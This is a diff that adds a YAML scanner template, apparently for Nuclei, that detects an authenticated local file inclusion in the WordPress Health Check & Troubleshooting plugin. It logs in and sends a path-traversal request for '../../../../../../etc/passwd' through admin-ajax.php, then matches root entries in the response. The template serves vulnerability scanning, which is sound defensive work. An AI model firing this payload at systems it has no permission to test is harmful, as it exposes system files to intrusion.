@@ -1,0 +1,52 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - part: header
+          type: word
+          words:
+            - application/json
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /wp-login.php HTTP/1.1
+          Host: {{Hostname}}
+          Origin: {{RootURL}}
+          Content-Type: application/x-www-form-urlencoded
+
+          log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+        - |
+          POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          action=health-check-view-file-diff&file=../../../../../../etc/passwd
+id: health-check-lfi
+info:
+    author: DhiyaneshDK
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.
+    metadata:
+        max-request: 2
+    name: WordPress Health Check & Troubleshooting <1.24 - Local File Inclusion
+    reference:
+        - https://wpscan.com/vulnerability/5eecc4a7-0b44-495d-9352-78dccebfc72a
+        - https://www.synacktiv.com/ressources/advisories/WordPress_Health_Check_1.2.3_Vulnerabilities.pdf
+    remediation: Upgrade to version 1.2.4 or later.
+    severity: high
+    tags:
+        - wp
+        - wordpress
+        - wp-plugin
+        - authenticated
+        - wpscan
+        - WordPress
+        - authenticate
